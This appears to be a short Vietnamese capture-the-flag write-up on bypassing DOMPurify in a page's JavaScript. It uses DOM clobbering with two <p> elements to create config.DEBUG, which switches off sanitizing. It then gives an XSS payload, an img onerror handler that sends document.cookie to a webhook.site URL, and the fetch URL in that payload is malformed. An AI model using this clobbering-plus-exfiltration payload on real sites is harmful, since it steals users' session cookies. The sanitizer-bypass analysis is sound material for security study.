![image](https://github.com/user-attachments/assets/123fcf8e-cb02-4a47-8f22-dae4a971b6bf)

```
document.addEventListener("DOMContentLoaded", () => {
	const urlParams = new URLSearchParams(window.location.search);
	const title = atob(urlParams.get("title"));
	const content = atob(urlParams.get("content"));
	document.getElementById("title").innerHTML =
		DOMPurify.sanitize(title);
	if (typeof config !== "undefined" && config.DEBUG) {
		document.getElementById("content").innerHTML = content;
	} else {
		document.getElementById("content").innerHTML =
			DOMPurify.sanitize(content);
	}
});
```
Đoạn code sanitize cả title và content nên ta ko thể xss được ngoại trù trường hợp biến config và config.DEBUG tồn tại. Tuy DOMPurify.sanitize có thể lọc xss nhưng nó lại ko lọc các tag bình thường như <p> , <a> nên ta có thể dùng kỹ thuật DOM clobbering

# payload
title:  
<p id="config"></p><p id="config" name="DEBUG">true</p>  
content:  
<img src=x onerror="fetch('//https://webhook.site/4c6a11ba-e622-45ce-965f-29c5ca311c76?' + document.cookie")>

<img src="https://webhook.site/4c6a11ba-e622-45ce-965f-29c5ca311c76">
